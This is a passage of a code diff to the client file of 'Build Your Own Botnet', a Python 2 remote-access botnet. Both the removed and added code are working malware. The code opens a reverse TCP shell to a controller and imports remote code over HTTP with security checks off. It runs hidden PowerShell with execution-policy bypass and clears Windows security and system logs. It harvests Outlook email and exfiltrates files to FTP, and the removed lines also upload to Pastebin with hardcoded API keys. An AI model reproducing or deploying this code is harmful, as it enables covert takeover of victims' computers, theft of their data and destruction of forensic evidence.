@@ -4,13 +4,11 @@ Build Your Own Botnet
 https://github.com/colental/byob
 Copyright (c) 2018 Daniel Vega-Myhre
 """
-from __future__ import print_function
 
-# Standard Library
+# standard library
 
 import os
 import sys
-import imp
 import time
 import json
 import zlib
@@ -27,13 +25,12 @@ import marshal
 import zipfile
 import logging
 import hashlib
-import itertools
 import functools
 import threading
 import cStringIO
+import httpimport
 import contextlib
 import subprocess
-import collections
 import logging.handlers
 
 try:
@@ -41,24 +38,16 @@ try:
 except ImportError:
     from urllib.request import urlopen
 
-# Remote Imports
 
-with remote_repo(['Crypto', 'Crypto.Util', 'Crypto.Cipher.AES', 'Crypto.Hash.MD5', 'Cryptodome', 'win32com.client'], base_url):
-    for module in ['Crypto', 'Crypto.Util', 'Crypto.Cipher.AES', 'Crypto.Hash.MD5', 'Cryptodome', 'win32com.client']:
-        try:
-            exec "import %s" % module in globals()
-            Util.debug("%s imported successfully." % module)
-        except ImportError:
-            Util.debug("%s import failed." % module)
+# globals
 
-# Globals
+_debug      = True
+_abort      = False
+_threads    = dict({})
+httpimport.INSECURE = True
 
-_debug  = True
-_abort  = False
 
-        
-# Decorators
-
+# decorators
 
 def config(*arg, **options):
     """
@@ -88,217 +77,20 @@ def threaded(function):
     return _threaded
 
 
-# Functions
+
+# classes
 
 
-def __create_github_url(username, repo, branch='master'):
-    github_raw_url = 'https://raw.githubusercontent.com/{user}/{repo}/{branch}/'
-    return github_raw_url.format(user=username, repo=repo, branch=branch)
-
-
-def _add_git_repo(url_builder, username=None, repo=None, module=None, branch=None, commit=None):
-    if username == None or repo == None:
-        raise Error("'username' and 'repo' parameters cannot be None")
-    if commit and branch:
-        raise Error("'branch' and 'commit' parameters cannot be both set!")
-    if commit:
-        branch = commit
-    if not branch:
-        branch = 'master'
-    if not module:
-        module = repo
-    if type(module) == str:
-        module = [module]
-    url = url_builder(username, repo, branch)
-    return add_remote_repo(module, url)
-
-
-def load(module_name, url = 'http://localhost:8000/'):
-    """
-    Directly import module remotely
-    """
-    importer = Importer([module_name], url)
-    loader = importer.find_module(module_name)
-    if loader != None :
-        module = loader.load_module(module_name)
-        if module :
-            return module
-        
-
-def add_remote_repo(modules, base_url='http://localhost:8000/'):
-    """
-    Add an remote importer object to sys.meta_path
-    """
-    importer = Importer(modules, base_url)
-    sys.meta_path.append(importer)
-    return importer
-
-
-def remove_remote_repo(base_url):
-    """
-    Remove the remote repository in sys.meta_path
-    """
-    for importer in sys.meta_path:
-        try:
-            if importer.base_url[:-1] == base_url:
-                sys.meta_path.remove(importer)
-                return True
-        except Exception as e:
-            return False
-
-
-@contextlib.contextmanager
-def remote_repo(modules, base_url='http://localhost:8000/'):
-    """
-    Context manager for remotely importing modules 
-    """
-    importer = add_remote_repo(modules, base_url)
-    yield
-    remove_remote_repo(base_url)
-
-    
-@contextlib.contextmanager
-def github_repo(username=None, repo=None, module=None, branch=None, commit=None):
-    """
-    Context manager for remotely importing modules from Github
-    """
-    importer = _add_git_repo(__create_github_url,
-        username, repo, module=module, branch=branch, commit=commit)
-    yield
-    url = __create_github_url(username, repo, branch)
-    remove_remote_repo(url)
-
-
-# Classes
-
-
-class Importer(object):
-    
-    """
-    Importer (Build Your Own Botnet)
-    
-    """
-    
-    def __init__(self, modules, base_url):
-        self.module_names = modules
-        self.base_url = base_url + '/'
-        self.non_source = False
-
-
-    def find_module(self, fullname, path=None):
-        if fullname.split('.')[0] not in self.module_names:
-            return None
-        try:
-            loader = imp.find_module(fullname, path)
-            if loader:
-                return None
-        except ImportError:
-            pass
-        if fullname.split('.').count(fullname.split('.')[-1]) > 1:
-            return None
-        return self
-
-
-    def load_module(self, name):
-        imp.acquire_lock()
-        Util.debug("[+] Loading %s" % name)
-        if name in sys.modules:
-            imp.release_lock()
-            return sys.modules[name]
-        if name.split('.')[-1] in sys.modules:
-            imp.release_lock()
-            return sys.modules[name.split('.')[-1]]
-        module_url = self.base_url + '%s.py' % name.replace('.', '/')
-        package_url = self.base_url + '%s/__init__.py' % name.replace('.', '/')
-        zip_url = self.base_url + '%s.zip' % name.replace('.', '/')
-        final_url = None
-        final_src = None
-        try:
-            package_src = None
-            if self.non_source :    
-                package_src = self.__fetch_compiled(package_url)
-            if package_src == None :
-                package_src = urlopen(package_url).read()
-            final_src = package_src
-            final_url = package_url
-        except IOError as e:
-            package_src = None
-        if final_src == None:
-            try:
-                module_src = None
-                if self.non_source :    
-                    module_src = self.__fetch_compiled(module_url)
-                if module_src == None : 
-                    module_src = urlopen(module_url).read()
-                final_src = module_src
-                final_url = module_url
-            except IOError as e:
-                module_src = None
-                imp.release_lock()
-                return None
-        mod = imp.new_module(name)
-        mod.__loader__ = self
-        mod.__file__ = final_url
-        if not package_src:
-            mod.__package__ = name
-        else:
-            mod.__package__ = name.split('.')[0]
-        mod.__path__ = ['/'.join(mod.__file__.split('/')[:-1]) + '/']
-        sys.modules[name] = mod
-        exec(final_src, mod.__dict__)
-        Util.debug("[+] '%s' imported succesfully!" % name)
-        imp.release_lock()
-        return mod
-
-    def __fetch_compiled(self, url) :
-        module_src = None
-        try :
-            module_compiled = urlopen(url + 'c').read()  
-            try :
-                module_src = marshal.loads(module_compiled[8:])
-                return module_src
-            except ValueError :
-                pass
-            try :
-                module_src = marshal.loads(module_compiled[12:]) 
-                return module_src
-            except ValueError :
-                pass
-        except IOError as e:
-            Util.debug("[-] No compiled version ('.pyc') for '%s' module found!" % url.split('/')[-1])
-        return module_src
-    
-
-
-class Util():
+class util():
 
     """
-    Util (Build Your Own Botnet)
+    Utilities (Build Your Own Botnet)
 
     """
-    global _debug
     global _abort
+    global _debug
+    global _threads
 
-    @staticmethod
-    def task_handler(host, port):
-        """
-        Returns logger configured for reporting task results to server
-        """
-        logger  = logging.getLogger(Util.public_ip())
-        handler = logging.handlers.SocketHandler(host, port)
-        logger.setLevel(logging.DEBUG)
-        logger.handlers = [handler]
-        return logger
-
-    @staticmethod
-    def debugger():
-        """
-        Returns logger configured for printing debugging information 
-        """
-        logger = logging.getLogger(__name__)
-        logger.setLevel(logging.DEBUG)
-        logger.handlers = [logging.StreamHandler()]
-        return logger
 
     @staticmethod
     def debug(info):
@@ -306,7 +98,11 @@ class Util():
         Log debugging info
         """
         if _debug:
-            Util.debugger().debug(str(info))
+            logger = logging.getLogger(__name__)
+            logger.setLevel(logging.DEBUG)
+            logger.handlers = [logging.StreamHandler()]
+            logger.debug(str(info))
+            
 
     @staticmethod
     def platform():
@@ -316,7 +112,8 @@ class Util():
         try:
             return sys.platform
         except Exception as e:
-            Util.debug("{} error: {}".format(platform.func_name, str(e)))
+            util.debug("{} error: {}".format(platform.func_name, str(e)))
+
 
     @staticmethod
     def public_ip():
@@ -326,7 +123,8 @@ class Util():
         try:
             return urllib2.urlopen('http://api.ipify.org').read()
         except Exception as e:
-            Util.debug("{} error: {}".format(public_ip.func_name, str(e)))
+            util.debug("{} error: {}".format(public_ip.func_name, str(e)))
+
 
     @staticmethod
     def local_ip():
@@ -336,7 +134,8 @@ class Util():
         try:
             return socket.gethostbyname(socket.gethostname())
         except Exception as e:
-            Util.debug("{} error: {}".format(local_ip.func_name, str(e)))
+            util.debug("{} error: {}".format(local_ip.func_name, str(e)))
+
 
     @staticmethod
     def mac_address():
@@ -346,7 +145,8 @@ class Util():
         try:
             return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
         except Exception as e:
-            Util.debug("{} error: {}".format(mac_address.func_name, str(e)))
+            util.debug("{} error: {}".format(mac_address.func_name, str(e)))
+
 
     @staticmethod
     def architecture():
@@ -356,7 +156,8 @@ class Util():
         try:
             return int(struct.calcsize('P') * 8)
         except Exception as e:
-            Util.debug("{} error: {}".format(architecture.func_name, str(e)))
+            util.debug("{} error: {}".format(architecture.func_name, str(e)))
+
 
     @staticmethod
     def device():
@@ -366,7 +167,8 @@ class Util():
         try:
             return socket.getfqdn(socket.gethostname())
         except Exception as e:
-            Util.debug("{} error: {}".format(device.func_name, str(e)))
+            util.debug("{} error: {}".format(device.func_name, str(e)))
+
 
     @staticmethod
     def username():
@@ -376,7 +178,8 @@ class Util():
         try:
             return os.getenv('USER', os.getenv('USERNAME'))
         except Exception as e:
-            Util.debug("{} error: {}".format(username.func_name, str(e)))
+            util.debug("{} error: {}".format(username.func_name, str(e)))
+
 
     @staticmethod
     def administrator():
@@ -386,7 +189,8 @@ class Util():
         try:
             return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)
         except Exception as e:
-            Util.debug("{} error: {}".format(administrator.func_name, str(e)))
+            util.debug("{} error: {}".format(administrator.func_name, str(e)))
+
 
     @staticmethod
     def ipv4(address):
@@ -399,6 +203,7 @@ class Util():
         except:
             return False
 
+
     @staticmethod
     def variable(length=6):
         """
@@ -407,7 +212,8 @@ class Util():
         try:
             return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))
         except Exception as e:
-            Util.debug("{} error: {}".format(variable.func_name, str(e)))
+            util.debug("{} error: {}".format(variable.func_name, str(e)))
+
 
     @staticmethod
     def status(timestamp):
@@ -423,7 +229,8 @@ class Util():
                   '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
             return ', '.join([i for i in data if i])
         except Exception as e:
-            Util.debug("{} error: {}".format(job_status.func_name, str(e)))
+            util.debug("{} error: {}".format(job_status.func_name, str(e)))
+
 
     @staticmethod
     def post(url, headers={}, data={}):
@@ -437,7 +244,8 @@ class Util():
                 req.headers[key] = value
             return urllib2.urlopen(req).read()
         except Exception as e:
-            Util.debug("{} error: {}".format(post_request.func_name, str(e)))
+            util.debug("{} error: {}".format(post_request.func_name, str(e)))
+
 
     @staticmethod
     def alert(text, title):
@@ -450,7 +258,8 @@ class Util():
             t.start()
             return t
         except Exception as e:
-            Util.debug("{} error: {}".format(windows_alert.func_name, str(e)))
+            util.debug("{} error: {}".format(windows_alert.func_name, str(e)))
+
 
     @staticmethod
     def normalize(source):
@@ -469,7 +278,8 @@ class Util():
             else:
                 return bytes(source)
         except Exception as e2:
-            Util.debug("{} error: {}".format(imgur.func_name, str(e2)))
+            util.debug("{} error: {}".format(imgur.func_name, str(e2)))
+
 
     @staticmethod
     def registry_key(registry_key, key, value):
@@ -484,8 +294,9 @@ class Util():
                 _winreg.CloseKey(reg_key)
                 return True
             except Exception as e:
-                Util.debug("{} error: {}".format(str(e)))
+                util.debug("{} error: {}".format(str(e)))
         return False
+
 
     @staticmethod
     def png(image):
@@ -521,7 +332,8 @@ class Util():
             fileh.seek(0)
             return fileh
         except Exception as e:
-            Util.debug("{} error: {}".format(png_from_data.func_name, str(e)))
+            util.debug("{} error: {}".format(png_from_data.func_name, str(e)))
+
 
     @staticmethod
     def emails(emails):
@@ -529,7 +341,7 @@ class Util():
         Takes input of emails from Outlook MAPI inbox and returns them in JSON format
         """
         try:
-            output = collections.OrderedDict()
+            output = {}
             while True:
                 try:
                     email = emails.GetNext()
@@ -544,7 +356,7 @@ class Util():
                 else: break
             return output
         except Exception as e:
-            Util.debug("{} error: {}".format(emails.func_name, str(e)))
+            util.debug("{} error: {}".format(emails.func_name, str(e)))
 
 
     @staticmethod
@@ -574,63 +386,22 @@ class Util():
             else:
                 pass
         except Exception as e:
-            Util.debug("{} error: {}".format(delete.func_name, str(e)))
-
-
-    @staticmethod
-    def import_modules(base_url='http://localhost:8000'):
-        """
-        import modules remotely without installing from github or a server 
-        """
-        imports = {}
-        with remote_repo(__modules__, base_url):
-            for module in __modules__:
-                try:
-                    exec "import %s" % module in globals()
-                    imports[module] = globals().get(module)
-                    Util.debug("%s imported successfully." % module)
-                except ImportError:
-                    Util.debug("%s import failed." % module)
-        return imports
-    
-
-    @staticmethod
-    def find_server(api_url, api_key):
-        """
-        Use API Key to dynamically locate an active server
-        """
-        host, port  = 'localhost', 1337
-        try:
-            if api_url.startswith('http'):
-                req         = urllib2.Request(api_url)
-                req.headers = {'API-Key': api_key}
-                response    = urllib2.urlopen(req).read()
-                try:
-                    host = json.loads(response)['main_ip']
-                except: pass
-            else:
-                Util.debug("Error: invalid URL '{}'".format(api_url))
-            if not Util.ipv4(host):
-                Util.debug("Error: invalid target host '{}'".format(host))
-                host = 'localhost'
-        except Exception as e:
-            Util.debug(str(e))
-        return host, port
-
+            util.debug("{} error: {}".format(delete.func_name, str(e)))
+            
 
     @staticmethod
     def clear_system_logs():
         """
-        Clear Windows system logs (Application, Security, Setup, System)
+        Clear Windows system logs (Application, security, Setup, System)
         """
         if os.name is 'nt':
             for log in ["application","security","setup","system"]:
                 try:
                     output = powershell_exec('"& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}"' % log)
                     if output:
-                        Util.debug(output)
+                        util.debug(output)
                 except Exception as e:
-                    Util.debug("{} error: {}".format(clear_system_logs.func_name, str(e)))
+                    util.debug("{} error: {}".format(clear_system_logs.func_name, str(e)))
 
     @staticmethod
     def kwargs(inputstring):
@@ -640,7 +411,7 @@ class Util():
         try:
             return {i.partition('=')[0]: i.partition('=')[2] for i in str(inputstring).split() if '=' in i}
         except Exception as e:
-            Util.debug("{} error: {}".format(kwargs.func_name, str(e)))
+            util.debug("{} error: {}".format(kwargs.func_name, str(e)))
 
 
     @staticmethod
@@ -650,92 +421,22 @@ class Util():
         """
         if os.name is 'nt':
             try:
-                powershell = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' if os.path.exists('C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
+                powershell = 'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists('C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
                 return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
             except Exception as e:
-                Util.debug("{} error: {}".format(powershell.func_name, str(e)))
-
-    @staticmethod
-    def imgur(source):
-        """
-        Upload image file/data to Imgur (requires: imgur api_key)
-        """
-        try:
-            api_key  = resource('api imgur api_key')
-            if api_key:
-                data = _get_normalized_data(source)
-                post = post('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})
-                return str(json.loads(post)['data']['link'])
-            else:
-                return "No Imgur API Key found"
-        except Exception as e2:
-            return "{} error: {}".format(imgur.func_name, str(e2))
-
-    @staticmethod
-    def pastebin(source, api_dev_key='daf350f687a94f079a8482a046264123', api_user_key='d05a18740c105927f3cbf38cf5acf069'):
-        """
-        Dump file/data to Pastebin (requires: pastebin api_dev_key)
-        """
-        try:
-            info={'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_dev_key}
-            if api_user_key:
-                info.update({'api_user_key'  : api_user_key})
-            paste = post('https://pastebin.com/api/api_post.php',data=info)        
-            return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
-        except Exception as e:
-            return '{} error: {}'.format(pastebin.func_name, str(e))
-
-    @staticmethod
-    def ftp(source, filetype=None):
-        """
-        Upload file/data to FTP server (requires: FTP login credentials)
-        """
-        try:
-            creds = resource('api ftp').split()
-            if creds:
-                path  = ''
-                local = time.ctime().split()
-                if os.path.isfile(str(source)):
-                    path   = source
-                    source = open(str(path), 'rb')
-                elif hasattr(source, 'seek'):
-                    source.seek(0)
-                else:
-                    source = cStringIO.StringIO(bytes(source))
-                try:
-                    host = ftplib.FTP(**creds)
-                except:
-                    return "Upload failed - remote FTP server authorization error"
-                addr = info.get('public_ip') if info.get('public_ip') else public_ip()
-                if 'tmp' not in host.nlst():
-                    host.mkd('/tmp')
-                if addr not in host.nlst('/tmp'):
-                    host.mkd('/tmp/{}'.format(addr))
-                if path:
-                    path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
-                else:
-                    if filetype:
-                        filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
-                        path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
-                    else:
-                        path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}'.format(local[1], local[2], local[3]))
-                stor = host.storbinary('STOR ' + path, source)
-                return path
-        except Exception as e2:
-            return "{} error: {}".format(ftp.func_name, str(e2))
+                util.debug("{} error: {}".format(powershell.func_name, str(e)))
 
 
 
-class Security():
+class security():
 
     """
     Security (Build Your Own Botnet)
 
     """
-    global _debug
     global _abort
-
-    session_key = None
+    global _debug
+    global _threads
 
     @staticmethod
     def diffiehellman(connection):
@@ -751,62 +452,81 @@ class Security():
                 connection.send(Crypto.Util.number.long_to_bytes(xA))
                 xB = Crypto.Util.number.bytes_to_long(connection.recv(256))
                 x  = pow(xB, a, p)
-                return hashlib.new('md5', Crypto.Util.number.long_to_bytes(x)).hexdigest()
+                return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
             except Exception as e:
-                Util.debug("{} error: {}".format(Security.diffiehellman.func_name, str(e)))
+                util.debug("{} error: {}".format(security.diffiehellman.func_name, str(e)))
         else:
-            Util.debug("{} erorr: invalid input type - expected '{}', received '{}'".format(Security.diffiehellman.func_name, socket.socket, type(connection)))
+            util.debug("{} erorr: invalid input type - expected '{}', received '{}'".format(security.diffiehellman.func_name, socket.socket, type(connection)))
 
     @staticmethod
-    def encrypt_aes(data, key):
+    def encrypt_aes(plaintext, key, padding='\x00'):
         """
         Encrypt data with 256-bit key using AES-cipher in authenticated OCB mode
         """
-        try:
-            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
-            ciphertext, tag = cipher.encrypt_and_digest(data)
-            output = b''.join((cipher.nonce, tag, ciphertext))
-            return base64.b64encode(output)
-        except Exception as e:
-            Util.debug("{} error: {}".format(Security.encrypt_aes.func_name, str(e)))
+        text        = bytes(data) + (int(AES.block_size) - len(bytes(data)) % int(AES.block_size)) * bytes(padding)
+        iv          = os.urandom(Crypto.Cipher.AES.block_size)
+        cipher      = Crypto.Cipher.AES.new(key[:max(Crypto.Cipher.AES.key_size)], Crypto.Cipher.AES.MODE_CBC, iv)
+        ciphertext  = iv + cipher.encrypt(text)
+        hmac_sha256 = Crypto.Hash.HMAC.new(key[max(Crypto.Cipher.AES.key_size):], msg=ciphertext, digestmod=Crypto.Hash.SHA256).digest()
+        return base64.b64encode(ciphertext + hmac_sha256)
 
     @staticmethod
-    def decrypt_aes(data, key):
+    def decrypt_aes(ciphertext, key, padding='\x00'):
         """
         Decrypt data encrypted by 256-bit key with AES-cipher in authenticated OCB mode
         """
-        try:
-            data = cStringIO.StringIO(base64.b64decode(data))
-            nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
-            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
-            return cipher.decrypt_and_verify(ciphertext, tag)
-        except Exception as e1:
-            Util.debug("{} error: {}".format(Security.decrypt_aes.func_name, str(e1)))
-            try:
-                return cipher.decrypt(ciphertext)
-            except Exception as e2:
-                return "{} error: {}".format(Security.decrypt_aes.func_name, str(e2))
+        ciphertext  = base64.b64decode(ciphertext)
+        iv          = ciphertext[:Crypto.Cipher.AES.block_size]
+        cipher      = Crypto.Cipher.AES.new(key[:max(Crypto.Cipher.AES.key_size)], Crypto.Cipher.AES.MODE_CBC, iv)
+        read_hmac   = ciphertext[-Crypto.Hash.SHA256.digest_size:]
+        calc_hmac   = Crypto.Hash.HMAC.new(key[max(Crypto.Cipher.AES.key_size):], msg=ciphertext[:-Crypto.Hash.SHA256.digest_size], digestmod=Crypto.Hash.SHA256).digest()
+        util.debug('HMAC-SHA256 hash authentication check failed - transmission may have been compromised') if calc_hmac != read_hmac else None
+        return cipher.decrypt(ciphertext[Crypto.Cipher.AES.block_size:-Crypto.Hash.SHA256.digest_size]).rstrip(padding)
 
 
-class Shell():
+class shell():
 
     """
-    Shell (Build Your Own Botnet)
+    Reverse TCP shell (Build Your Own Botnet)
     
     """
-    global _debug
     global _abort
+    global _debug
+    global _threads
 
-    def __init__(self, api=None):
+
+    def __init__(self, host='localhost', port=1337, **kwargs):
         self.session    = {}
-        self.info       = self.system_info()
-        self.commands   = {cmd: {'method': getattr(self, cmd), 'platforms': getattr(Shell, cmd).platforms, 'usage': getattr(Shell, cmd).usage, 'description': getattr(Shell, cmd).func_doc.strip().rstrip()} for cmd in vars(Shell) if hasattr(vars(Shell)[cmd], 'command') if getattr(vars(Shell)[cmd], 'command')}
+        self.system     = self.info()
+        self.api        = self._api(host, port, **kwargs)
+        self.commands   = {cmd: {'method': getattr(self, cmd), 'platforms': getattr(shell, cmd).platforms, 'usage': getattr(shell, cmd).usage, 'description': getattr(shell, cmd).func_doc.strip().rstrip()} for cmd in vars(shell) if hasattr(vars(shell)[cmd], 'command') if getattr(vars(shell)[cmd], 'command')}
         self._socket    = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self._flags     = {'connection': threading.Event(), 'mode': threading.Event(), 'prompt': threading.Event()}
-        self._modules   = Util.import_modules()
-        self._jobs      = Queue.Queue()
-        self._workers   = {}
-        self._api       = api
+        self._flags     = {'connection': threading.Event(), 'passive': threading.Event(), 'prompt': threading.Event()}
+        self._imports   = self._import_handler(host)
+
+
+    def _api(self, host, port, **kwargs):
+        try:
+            api = dict({'host': str(host), 'port': int(port)})
+            for k,v in kwargs.items():
+                if k in ('ftp','imgur','paste'):
+                    api[k] = v
+            return api
+        except Exception as e:
+            util.debug(e)
+
+            
+    def _import_handler(self, host):
+        imports = dict({'packages': [], 'modules': []})
+        try:
+            imports.update({'packages': self.package_handler(host)})
+        except Exception as e1:
+            util.debug(e1)
+        try:
+            imports.update({'modules': self.module_handler(host)})
+        except Exception as e2:
+            util.debug(e2)
+        return imports
 
 
     @threaded
@@ -815,29 +535,30 @@ class Shell():
         while True:
             try:
                 self._flags['prompt'].wait()
-                self.send_task(**{'client': self.info['uid'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
+                self.send(**{'client': self.system['uid'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
                 self._flags['prompt'].clear()
             except Exception as e:
-                Util.debug("{} error: {}".format('prompt', str(e)))
+                util.debug("{} error: {}".format('prompt', str(e)))
                 self._flags['prompt'].clear()
 
+
     @threaded
-    def _task_handler(self):
+    def _thread_handler(self):
         try:
             while True:
                 if _abort:
                     break
                 else:
-                    jobs = self._workers.items()
+                    jobs = _threads.items()
                     for task, worker in jobs:
                         if not worker.is_alive():
-                            dead = self._workers.pop(task, None)
+                            dead = _threads.pop(task, None)
                             del dead
                     time.sleep(1)
         except Exception as e:
-            Util.debug('{} error: {}'.format(self._handler.func_name, str(e)))
+            util.debug('{} error: {}'.format(self._handler.func_name, str(e)))
 
-    
+
     @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
     def cd(self, path='.'):
         """
@@ -849,7 +570,7 @@ class Shell():
             else:
                 return os.chdir('.')
         except Exception as e:
-            Util.debug("{} error: {}".format(self.cd.func_name, str(e)))
+            util.debug("{} error: {}".format(self.cd.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
@@ -869,7 +590,7 @@ class Shell():
             else:
                 return "Error: path not found"
         except Exception as e2:
-            Util.debug("{} error: {}".format(self.ls.func_name, str(e2)))
+            util.debug("{} error: {}".format(self.ls.func_name, str(e2)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
@@ -890,10 +611,53 @@ class Shell():
                         else:
                             break
                 except Exception as e1:
-                    Util.debug("{} error: {}".format(self.cat.func_name, str(e1)))
+                    util.debug("{} error: {}".format(self.cat.func_name, str(e1)))
             return '\n'.join(output)
         except Exception as e2:
-            Util.debug("{} error: {}".format(self.cat.func_name, str(e2))  )
+            util.debug("{} error: {}".format(self.cat.func_name, str(e2))  )
+
+
+    def ftp(self, source, filetype=None):
+        """
+        Upload file/data to FTP server (requires: FTP credentials)
+        """
+        try:
+            creds = self.api.get('ftp')
+            if creds and isinstance(creds, list):
+                if len(creds) != 3:
+                    return "Error: missing one or more FTP credentials (host, user, password)"
+                creds = {'host': creds[0], 'user': creds[1], 'password': creds[2]}
+                path  = ''
+                local = time.ctime().split()
+                if os.path.isfile(str(source)):
+                    path   = source
+                    source = open(str(path), 'rb')
+                elif hasattr(source, 'seek'):
+                    source.seek(0)
+                else:
+                    source = cStringIO.StringIO(bytes(source))
+                try:
+                    host = ftplib.FTP(**creds)
+                except:
+                    return "Upload failed - remote FTP server error: invalid credentials ('{}')".format(repr(creds))
+                addr = public_ip()
+                if 'tmp' not in host.nlst():
+                    host.mkd('/tmp')
+                if addr not in host.nlst('/tmp'):
+                    host.mkd('/tmp/{}'.format(addr))
+                if path:
+                    path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
+                else:
+                    if filetype:
+                        filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
+                        path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
+                    else:
+                        path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}'.format(local[1], local[2], local[3]))
+                stor = host.storbinary('STOR ' + path, source)
+                return path
+        except Exception as e2:
+            return "{} error: {}".format(self.ftp.func_name, str(e2))
+
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
@@ -904,7 +668,7 @@ class Shell():
         try:
             return os.getcwd()
         except Exception as e:
-            Util.debug("{} error: {}".format(self.pwd.func_name, str(e)))
+            util.debug("{} error: {}".format(self.pwd.func_name, str(e)))
 
 
     def run(self):
@@ -913,14 +677,13 @@ class Shell():
         """
         try:
             if self.connect():
-                self._workers['tasks'] = self._task_handler()
-                self._workers['shell'] = self.reverse_tcp_shell()
+                _threads['thread_handler'] = self._thread_handler()
+                _threads['shell'] = self.reverse_tcp_shell()
             else:
-                Util.debug("connection timed out")
+                util.debug("connection timed out")
         except Exception as e:
-            Util.debug("{} error: {}".format(self.run.func_name, str(e)))
-        return self.restart(self.run.func_name)
-
+            util.debug("{} error: {}".format(self.run.func_name, str(e)))
+    
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
     def eval(self, code):
@@ -930,7 +693,7 @@ class Shell():
         try:
             return eval(code)
         except Exception as e:
-            Util.debug("{} error: {}".format(self.eval.func_name, str(e)))
+            util.debug("{} error: {}".format(self.eval.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
@@ -943,7 +706,7 @@ class Shell():
                 path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
                 return path
             except Exception as e:
-                Util.debug("{} error: {}".format(self.wget.func_name, str(e)))
+                util.debug("{} error: {}".format(self.wget.func_name, str(e)))
         else:
             return "Invalid target URL - must begin with 'http'"
         
@@ -961,17 +724,16 @@ class Shell():
                     self._socket.shutdown(socket.SHUT_RDWR)
                     self._socket.close()
             self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.info = None
-            Security.session_key = None
+            self.session['key'] = None
             self.session['public_key'] = None
-            _workers = self._workers.keys()
-            for worker in _workers:
+            _threads = _threads.keys()
+            for worker in _threads:
                 try:
                     self.stop(worker)
                 except Exception as e2:
-                    Util.debug("{} error: {}".format(self.kill.func_name, str(e2)))
+                    util.debug("{} error: {}".format(self.kill.func_name, str(e2)))
         except Exception as e:
-            Util.debug("{} error: {}".format(self.kill.func_name, str(e)))
+            util.debug("{} error: {}".format(self.kill.func_name, str(e)))
     
     @config(platforms=['win32','linux2','darwin'], command=True, usage='help')
     def help(self, cmd=None):
@@ -982,12 +744,12 @@ class Shell():
             try:
                 return json.dumps({self.commands[c]['usage']: self.commands[c]['description'] for c in self.commands})
             except Exception as e1:
-                Util.debug("{} error: {}".format(self.help.func_name, str(e1)))
+                util.debug("{} error: {}".format(self.help.func_name, str(e1)))
         elif hasattr(self, str(cmd)) and 'prompt' not in cmd:
             try:
                 return json.dumps({self.commands[cmd]['usage']: self.commands[cmd]['description']})
             except Exception as e2:
-                Util.debug("{} error: {}".format(self.help.func_name, str(e2)))
+                util.debug("{} error: {}".format(self.help.func_name, str(e2)))
         else:
             return "Invalid command - '{}' not found".format(cmd)
 
@@ -1000,11 +762,14 @@ class Shell():
         try:
             attribute = str(attribute)
             if 'jobs' in attribute:
-                return json.dumps({a: status(self._workers[a].name) for a in self._workers if self._workers[a].is_alive()})
+                return json.dumps({a: status(_threads[a].name) for a in _threads if _threads[a].is_alive()})
+            
             elif 'privileges' in attribute:
-                return json.dumps({'username': self.info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
+                return json.dumps({'username': self.system.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
+
             elif 'info' in attribute:
-                return json.dumps(self.info)
+                return json.dumps(self.system)
+
             elif hasattr(self, attribute):
                 try:
                     return json.dumps(getattr(self, attribute))
@@ -1012,6 +777,7 @@ class Shell():
                     try:
                         return json.dumps(vars(getattr(self, attribute)))
                     except: pass
+
             elif hasattr(self, str('_%s' % attribute)):
                 try:
                     return json.dumps(getattr(self, str('_%s' % attribute)))
@@ -1019,35 +785,59 @@ class Shell():
                     try:
                         return json.dumps(vars(getattr(self, str('_%s' % attribute))))
                     except: pass
+                    
             else:
